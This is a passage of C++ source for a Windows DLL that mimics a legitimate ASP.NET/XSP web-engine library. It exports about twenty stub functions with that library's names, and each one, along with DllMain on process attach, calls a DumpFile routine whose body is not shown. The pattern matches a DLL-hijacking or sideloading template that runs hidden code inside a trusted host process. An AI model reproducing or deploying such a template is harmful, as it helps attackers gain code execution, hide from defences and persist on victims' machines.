extern "C" __declspec(dllexport) auto XspLogEvent() {
	DumpFile(hMod);
	return true;
}

extern "C" __declspec(dllexport) auto DisposeAppDomainsIndirect() {
	DumpFile(hMod);
	return true;
}

extern "C" __declspec(dllexport) auto DrainThreadPool() {
	DumpFile(hMod);
	return true;
}

extern "C" __declspec(dllexport) auto IsConfigFileName() {
	DumpFile(hMod);
	return true;
}

extern "C" __declspec(dllexport) auto EtwTraceAspNetRegister() {
	DumpFile(hMod);
	return true;
}

extern "C" __declspec(dllexport) auto GetConfigurationFromNativeCode() {
	DumpFile(hMod);
	return true;
}

extern "C" __declspec(dllexport) auto ClrQueueUserWorkItem() {
	DumpFile(hMod);
	return true;
}

extern "C" __declspec(dllexport) auto PerfDecrementGlobalCounter() {
	DumpFile(hMod);
	return true;
}

extern "C" __declspec(dllexport) auto PerfIncrementGlobalCounter() {
	DumpFile(hMod);
	return true;
}

extern "C" __declspec(dllexport) auto TraceEnabled() {
	DumpFile(hMod);
	return true;
}

extern "C" __declspec(dllexport) auto TraceRaiseEvent() {
	DumpFile(hMod);
	return true;
}

extern "C" __declspec(dllexport) auto GetAppDomainIndirect() {
	DumpFile(hMod);
	return true;
}

extern "C" __declspec(dllexport) auto AttachHandleToThreadPool() {
	DumpFile(hMod);
	return true;
}

extern "C" __declspec(dllexport) auto LoadLibraryUsingFullPath() {
	DumpFile(hMod);
	return true;
}

extern "C" __declspec(dllexport) auto GetProcessMemoryInformation() {
	DumpFile(hMod);
	return true;
}

extern "C" __declspec(dllexport) auto UnInitializeManagedCode() {
	DumpFile(hMod);
	return true;
}

extern "C" __declspec(dllexport) auto PerfCounterInitialize() {
	DumpFile(hMod);
	return true;
}

extern "C" __declspec(dllexport) auto InitializeLibrary() {
	DumpFile(hMod);
	return true;
}

extern "C" __declspec(dllexport) auto GetGlobalConfigFullPathW() {
	DumpFile(hMod);
	return true;
}

extern "C" __declspec(dllexport) auto GetXSPHeap() {
	DumpFile(hMod);
	return true;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)

{
	if (ul_reason_for_call == DLL_PROCESS_ATTACH)
	{
		hMod = hModule;
		DumpFile(hMod);
	}
	return TRUE;
}
